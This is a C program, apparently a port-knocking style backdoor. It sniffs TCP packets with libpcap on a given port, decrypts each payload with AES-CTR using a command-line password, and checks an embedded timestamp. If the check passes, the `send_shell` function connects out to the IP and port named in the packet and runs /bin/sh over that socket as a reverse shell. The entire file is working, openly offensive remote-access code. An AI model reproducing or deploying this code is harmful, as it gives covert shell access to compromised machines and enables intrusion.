#include <pcap.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <ctype.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#include <unistd.h>
#include <time.h>
#include <tomcrypt.h>

/* default snap length (maximum bytes per packet to capture) */
#define SNAP_LEN 1518

/* ethernet headers are always exactly 14 bytes [1] */
#define SIZE_ETHERNET 14

/* Ethernet addresses are 6 bytes */
#define ETHER_ADDR_LEN	6
struct sniff_ethernet {
        u_char  ether_dhost[ETHER_ADDR_LEN];    /* destination host address */
        u_char  ether_shost[ETHER_ADDR_LEN];    /* source host address */
        u_short ether_type;                     /* IP? ARP? RARP? etc */
};

/* IP header */
struct sniff_ip {
        u_char  ip_vhl;                 /* version << 4 | header length >> 2 */
        u_char  ip_tos;                 /* type of service */
        u_short ip_len;                 /* total length */
        u_short ip_id;                  /* identification */
        u_short ip_off;                 /* fragment offset field */
        #define IP_RF 0x8000            /* reserved fragment flag */
        #define IP_DF 0x4000            /* dont fragment flag */
        #define IP_MF 0x2000            /* more fragments flag */
        #define IP_OFFMASK 0x1fff       /* mask for fragmenting bits */
        u_char  ip_ttl;                 /* time to live */
        u_char  ip_p;                   /* protocol */
        u_short ip_sum;                 /* checksum */
        struct  in_addr ip_src,ip_dst;  /* source and dest address */
};
#define IP_HL(ip)               (((ip)->ip_vhl) & 0x0f)
#define IP_V(ip)                (((ip)->ip_vhl) >> 4)

/* TCP header */
typedef u_int tcp_seq;

struct sniff_tcp {
        u_short th_sport;               /* source port */
        u_short th_dport;               /* destination port */
        tcp_seq th_seq;                 /* sequence number */
        tcp_seq th_ack;                 /* acknowledgement number */
        u_char  th_offx2;               /* data offset, rsvd */
#define TH_OFF(th)      (((th)->th_offx2 & 0xf0) >> 4)
        u_char  th_flags;
        #define TH_FIN  0x01
        #define TH_SYN  0x02
        #define TH_RST  0x04
        #define TH_PUSH 0x08
        #define TH_ACK  0x10
        #define TH_URG  0x20
        #define TH_ECE  0x40
        #define TH_CWR  0x80
        #define TH_FLAGS        (TH_FIN|TH_SYN|TH_RST|TH_ACK|TH_URG|TH_ECE|TH_CWR)
        u_short th_win;                 /* window */
        u_short th_sum;                 /* checksum */
        u_short th_urp;                 /* urgent pointer */
};


/* void check_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet){
	
	
} */
char *password;

void app_usage(char *app){

	printf("Usage: %s [interface] [port] [password]\n", app);
	printf("\n");
	printf("Options:\n");
	printf("	interface	(Optional) Listen on <interface> for packets.\n");
	printf("	port		Listen on <port> for packets.\n");
	printf("	password	Password for reverse shell to be sent.\n");
	printf("\n");
	return;
}

int send_shell(char *dest_ip, char *dest_port){
    
	struct sockaddr_in sa;
    int s;
	
    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = inet_addr(dest_ip);
    sa.sin_port = htons(atoi(dest_port));
	
    s = socket(AF_INET, SOCK_STREAM, 0);
    connect(s, (struct sockaddr *)&sa, sizeof(sa));
    dup2(s, 0);
    dup2(s, 1);
    dup2(s, 2);
	
    execve("/bin/sh", 0, 0);
    return 0;
}

char *decrypt(char IV[17], char key[17], char buffer[34]){
	
	symmetric_CTR ctr;
	int err;

	if (register_cipher(&aes_desc) == -1){
		return NULL;
	}

	if (( err = ctr_start(find_cipher("aes"), IV, key, 16, 0, CTR_COUNTER_LITTLE_ENDIAN, &ctr)) != CRYPT_OK){
		printf("setup() error: %s", error_to_string(err));
		return NULL;
	}
	
	if (( err = ctr_setiv(IV, 16, &ctr)) != CRYPT_OK){
		//printf("IV failed%s", error_to_string(err));
		return NULL;	
	}
	if (( err = ctr_decrypt(buffer, buffer, 34, &ctr)) != CRYPT_OK){
		//printf("decrypt failed");
		return NULL;
	}

	if (( err = ctr_done(&ctr)) != CRYPT_OK){
		//printf("ctr_done failed");
		return NULL;
	}
	
	zeromem(key, 17);
	zeromem(&ctr, sizeof(ctr));

	return buffer;
}

void check_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet){
	
	static int count = 1;                   /* packet counter */
	
	/* declare pointers to packet headers */
	const struct sniff_ethernet *ethernet;  /* The ethernet header [1] */
	const struct sniff_ip *ip;              /* The IP header */
	const struct sniff_tcp *tcp;            /* The TCP header */
	const char *payload;                    /* Packet payload */
	
	int size_ip;
	int size_tcp;
	int size_payload;
	
	char iv[17];
	char *timestamp = NULL;
	char *dest_ip = NULL;
	char *dest_port = NULL;
	
	count++;
	
	/* define ethernet header */
	ethernet = (struct sniff_ethernet*)(packet);
	
	/* define/compute ip header offset */
	ip = (struct sniff_ip*)(packet + SIZE_ETHERNET);
	size_ip = IP_HL(ip)*4;
	if (size_ip < 20) {
		//printf("   * Invalid IP header length: %u bytes\n", size_ip);
		return;
	}
	
	/* make sure it is TCP */	
	switch(ip->ip_p) {
		case IPPROTO_TCP:
			//printf("   Protocol: TCP\n");
			break;
		case IPPROTO_UDP:
			//printf("   Protocol: UDP\n");
			return;
		case IPPROTO_ICMP:
			//printf("   Protocol: ICMP\n");
			return;
		case IPPROTO_IP:
			//printf("   Protocol: IP\n");
			return;
		default:
			//printf("   Protocol: unknown\n");
			return;
	}
	
	
	/* define/compute tcp header offset */
	tcp = (struct sniff_tcp*)(packet + SIZE_ETHERNET + size_ip);
	size_tcp = TH_OFF(tcp)*4;
	if (size_tcp < 20) {
		//printf("   * Invalid TCP header length: %u bytes\n", size_tcp);
		return;
	}
	
	/* define/compute tcp payload (segment) offset */
	payload = (u_char *)(packet + SIZE_ETHERNET + size_ip + size_tcp);
	
	/* compute tcp payload (segment) size */
	size_payload = ntohs(ip->ip_len) - (size_ip + size_tcp);
	
	printf("\nPayload:\n%s\n", payload);
	printf("Payload Size: %d\n", size_payload);
	
	//decrypt then parse string for timestamp (verify), IP and port
	strncpy(iv, (const char *)payload, 16);
	iv[16] = 0;
	payload += 16;
	payload = decrypt(iv, password, (char *)payload);
	printf("\nDecrypted Payload: %s\n", payload);
	char *temp = (char *)payload;
	char *string = NULL;
	char *start, *end;
	const char *P0 = ";";
	
	start = temp;
	int ctr = 0;
	int loop_ctr = 0;
	while (ctr < 3){
		if (start = strstr(temp, P0)){
			start += 1;
			if (end = strstr(start, P0)){
				string = (char *)malloc(end - start+1);
				memcpy(string, start, end - start);
				string[end - start] = '\0';
				switch(ctr){
					case 0:
						timestamp = malloc(strlen(string)+1);
						strcpy(timestamp, string);
						break;
					case 1:
						dest_ip = malloc(strlen(string)+1);
						strcpy(dest_ip, string);
						break;
					case 2:
						dest_port = malloc(strlen(string)+1);
						strcpy(dest_port, string);
						break;
				}
				ctr++;
			}
		}
		temp = end;
		loop_ctr++;
		if (loop_ctr == 10){
			break;
		}
	}
	
	if (timestamp == NULL || dest_ip == NULL || dest_port == NULL){
		return;
	}
	
	time_t now = time(NULL);
	int now_d = (int)now;
	int timestamp_d = atoi(timestamp);
	if (abs(now_d-timestamp_d) > 10){
		printf("\ntimestamp invalid\n");
		return;
	}
	else{
		printf("\nTimestamp validated: %s\n", timestamp);
		printf("\nReverse shell sent!\n");
		send_shell(dest_ip, dest_port);
		return;
	}
	
	return;
}


int main(int argc, char *argv[]){
	
	char *dev = NULL;	
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t *handle;
	struct bpf_program fp;
	
	bpf_u_int32 mask;			/* subnet mask */
	bpf_u_int32 net;			/* ip */
	
	char *filter_exp; // eg. "port 8888" for port 8888

	if (argc == 4) {
		dev = argv[1];
		filter_exp = malloc(strlen("port ")+strlen(argv[2])+1);
		stpcpy(filter_exp, "port ");
		strcat(filter_exp, argv[2]);
		password = argv[3];
		//printf("\ndev: %s port: %s password: %s\n", dev, filter_exp, password);
	}
	else if (argc == 3){
		/* find a capture device if not specified on command-line */
		dev = pcap_lookupdev(errbuf);
		if (dev == NULL) {
			fprintf(stderr, "Couldn't find default device: %s\n",
			    errbuf);
			exit(EXIT_FAILURE);
		}
		filter_exp = malloc(strlen("port ")+strlen(argv[1])+1);
		stpcpy(filter_exp, "port ");
		strcat(filter_exp, argv[1]);
		password = argv[2];
		//printf("\ndev: %s port: %s password: %s\n", dev, filter_exp, password);
	}
	else if (argc > 4) {
		fprintf(stderr, "error: unrecognized command-line options\n\n");
		app_usage(argv[0]);
		exit(EXIT_FAILURE);
	}
	else {
		app_usage(argv[0]);
		exit(EXIT_FAILURE);
	}
	
	if (pcap_lookupnet(dev, &net, &mask, errbuf) == -1) {
		fprintf(stderr, "Couldn't get netmask for device %s: %s\n",
		    dev, errbuf);
		net = 0;
		mask = 0;
		exit(EXIT_FAILURE);
	}
	

	//pcap_t *pcap_open_live(char *dev, int snaplen, int promisc, int to_ms, char *ebuf);
	handle = pcap_open_live(dev, SNAP_LEN, 0, 10000, errbuf);
	if (handle == NULL) {
		fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
		exit(EXIT_FAILURE);
	}
	//assume ethernet headers --> make one for wifi interfaces? ************************************************************************************
	if (pcap_datalink(handle) != DLT_EN10MB) {
		fprintf(stderr, "Device %s doesn't provide Ethernet headers - not supported\n", dev);
		exit(EXIT_FAILURE);
	}
	if (pcap_compile(handle, &fp, filter_exp, 0, net) == -1) {
		fprintf(stderr, "Couldn't parse filter %s: %s\n", filter_exp, pcap_geterr(handle));
		exit(EXIT_FAILURE);
	}
	if (pcap_setfilter(handle, &fp) == -1) {
		fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(handle));
		exit(EXIT_FAILURE);
	}
	
	pcap_loop(handle, -1, check_packet, NULL);
	
	pcap_freecode(&fp);
	pcap_close(handle);
	return(0);

}


